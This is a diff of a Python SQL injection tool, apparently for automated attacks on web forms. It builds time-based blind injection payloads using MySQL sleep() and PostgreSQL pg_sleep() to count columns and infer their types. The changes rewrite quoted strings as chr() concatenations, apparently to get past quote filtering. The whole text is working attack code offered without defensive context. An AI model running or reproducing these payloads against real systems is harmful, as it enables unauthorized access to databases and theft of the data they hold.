@@ -133,7 +133,7 @@ if server == "mysql":
 	j = str(1)
 	num_col = 1
 	while True:
-		query = valid_search + inject + " and 1=sleep(2) union all select " + j + " from dual;#"
+		query = valid_search + inject + " and 1=sleep(2) union all select " + j + ";#"
 		parameters[asterisk] = query
 		start = time.time()
 		try:
@@ -196,13 +196,13 @@ if server == 0:
 #find the type of the columns for postgresql
 print ("finding the type of the columns presented per result...")
 type = str()
-order_list = ["\'needle\'"]
+order_list = ["chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"]
 for i in range(0, num_col - 1):
 	order_list.append(",null")
 count = 0
 while True:
 	if count > 0:
-		order_list[count] = ",\'needle\'"
+		order_list[count] = ",chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"
 	order_str = "".join(order_list)
 	query = valid_search + inject + " union select " + order_str + " from pg_sleep(2);--"
 	parameters[asterisk] = query
@@ -215,7 +215,10 @@ while True:
 		req = requests.post(url, cookies=cookies, data=parameters)
 	end = time.time()
 	if end - start < 3 and end - start > 1.9:
-		type += order_list[count]
+		if count == 0:
+			type += "\'needle\'"
+		else:
+			type += ",\'needle\'"
 	elif count == 0:
 		order_list[0] = "null"
 		type += "null"
